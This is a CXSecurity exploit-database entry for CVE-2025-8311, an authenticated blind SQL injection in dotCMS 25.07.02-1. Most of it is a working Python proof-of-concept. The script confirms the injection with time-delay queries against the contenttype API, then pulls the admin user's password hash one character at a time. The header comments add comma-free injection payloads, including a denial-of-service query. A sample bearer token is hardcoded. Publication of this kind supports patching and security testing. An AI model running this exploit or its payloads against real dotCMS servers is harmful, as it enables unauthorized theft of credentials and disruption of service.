---
title: dotCMS 25.07.02-1 Authenticated Blind SQL Injection
url: https://cxsecurity.com/issue/WLB-2025120017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-17
fetch_date: 2025-12-18T03:19:29.313370
---

# dotCMS 25.07.02-1 Authenticated Blind SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **dotCMS 25.07.02-1 Authenticated Blind SQL Injection** **2025.12.17**  Credit:  **[Matan Sandori](https://cxsecurity.com/author/Matan%2BSandori/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-8311](https://cxsecurity.com/cveshow/CVE-2025-8311/ "Click to see CVE-2025-8311")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

#!/usr/bin/env python3
# Exploit Title: dotCMS 25.07.02-1 - Authenticated Blind SQL Injection
# Google Dork: N/A
# Date: 2025-09-09
# Exploit Author: Matan Sandori (OSCP, OSEP, OSWE)
# Vendor Homepage:\*https://www.dotcms.com/
# Software Link: https://github.com/dotCMS/core/releases/tag/v25.07.02-1 (tested on: v25.07.02-1)
# Version: Affects 24.03.22 and later (see vendor advisory for fixed versions)
# Tested on: dotCMS v25.07.02-1 (Docker / Linux)
# CVE: CVE-2025-8311
# The application blocks the comma character, so a simple DoS payload like:
# ') AND 1=(SELECT 1 FROM generate\_series(1,500000) AS a CROSS JOIN generate\_series(1,500000) AS b) AND ('FYHh' LIKE 'FYHh
# will not work.
# Instead, a comma-free payload can be used, for example:
# ') AND 1=(WITH RECURSIVE nums(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM nums WHERE i < 1000000) SELECT MIN(1) FROM nums AS a CROSS JOIN nums AS b) AND ('A' LIKE 'A
# Example query for time-based extraction of data:
# ') AND 1=(SELECT CASE WHEN (substring(emailaddress from 1 for 1)='a') THEN (SELECT 1 FROM pg\_sleep(10) WHERE firstname='Admin') ELSE 1 END FROM user\_ WHERE firstname='Admin') AND ('1' LIKE '1
# This PoC demonstrates time-based blind SQLi. Error-based SQLi is also possible and allows faster data extraction.
# Using sqlmap with the --no-cast flag is recommended, as it will not work otherwise.
import sys
import time
import string
import urllib3
import requests
### User configuration
HOST="127.0.0.1:8443";
TARGET\_ACCOUNT = "admin@dotcms.com";
SLEEP\_TIME=10;
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhcGk0ZjFhNGYyMi1lYzI5LTQ4OTUtYTBlYi1jYjRkYjEzOGQ2MDAiLCJ4bW9kIjoxNzUxOTQzOTEwMDAwLCJuYmYiOjE3NTE5NDM5MTAsImlzcyI6ImRvdGNtc19kZXYiLCJsYWJlbCI6InRva2VuIiwiZXhwIjoxODQ2NjQxNjAxLCJpYXQiOjE3NTE5NDM5MTAsImp0aSI6IjMyNjIxYmRkLTNhYjEtNGRiMi1iNjEyLWMzMDg5M2EyODBiZSJ9.jqXkfM4Itxy\_q2kA10srcL\_3NBBx6keXx2PM0mESPFI";
CHARS = string.printable;
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning);
def encode\_all\_characters(string):
    return "".join("%{0:0>2x}".format(ord(char)) for char in string);
def send\_request(payload=""):
    payload = encode\_all\_characters(payload);
    burp0\_url = f"https://{HOST}/api/v1/contenttype?filter=LCKwsF&page=774232&per\_page=517532&orderby=wDdAmr&direction=DESC&type=DOTASSET&host=BBadoI&sites=PoC{payload}";
    burp0\_headers = {"Accept-Encoding": "gzip, deflate, br", "Accept": "\*/\*", "Accept-Language": "en-US;q=0.9,en;q=0.8", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Connection": "close", "Cache-Control": "max-age=0", "Authorization": f"Bearer {TOKEN}"};
    return requests.get(burp0\_url, headers=burp0\_headers, verify=False);
def send\_sqli(q):
    query = "') AND 1=(" + q + ") AND ('A' LIKE 'A";
    return send\_request(query);
def test\_sqli():
    print("[!] Checking target responsiveness...")
    r = send\_request();
    if '{"entity":[],"errors":[],"i18nMessagesMap":{},"messages":[],"pagination":{"currentPage":' not in r.text:
        print("[-] Target did NOT return the expected JSON structure. Exiting.");
        sys.exit(1);

    print("[+] Target responded correctly.\n");
    r = send\_sqli(f"SELECT 1 FROM PG\_SLEEP({SLEEP\_TIME})");
    if (not r.elapsed.total\_seconds() >= SLEEP\_TIME):
        print("[-] Target did not pause as expected; Exiting.");
        sys.exit(1);
def retrieve\_password(TEMPLATE, CHARS):
    CHARS = ":" + CHARS.replace(":", '');
    output = "";
    index = 1;
    while True:
        for character in CHARS:
            query = str(TEMPLATE).replace("[\_INDEX\_PLACEHOLDER\_]", str(index)).replace("[\_ASCII\_PLACEHOLDER\_]", str(ord(character)));

            r = send\_sqli(query);

            if (r.elapsed.total\_seconds() >= SLEEP\_TIME):
                print(f"[+] Found character: {character}");
                index += 1;
                output += character;
                break;
        else:
            break;
    return output;
test\_sqli();
print("[+] Target is Vulnerable to SQL Injection.\n");
TEMPLATE = f"SELECT (CASE WHEN (substring(password\_ from [\_INDEX\_PLACEHOLDER\_] for 1)=chr([\_ASCII\_PLACEHOLDER\_])) THEN (SELECT 1 FROM pg\_sleep({SLEEP\_TIME / 2}) WHERE emailaddress = '{TARGET\_ACCOUNT}') ELSE 1 END) from user\_ where emailaddress = '{TARGET\_ACCOUNT}'";
password = retrieve\_password(TEMPLATE, CHARS);
print(f"[+] Retrieved hash/password for {TARGET\_ACCOUNT}: {password}");

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120017)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top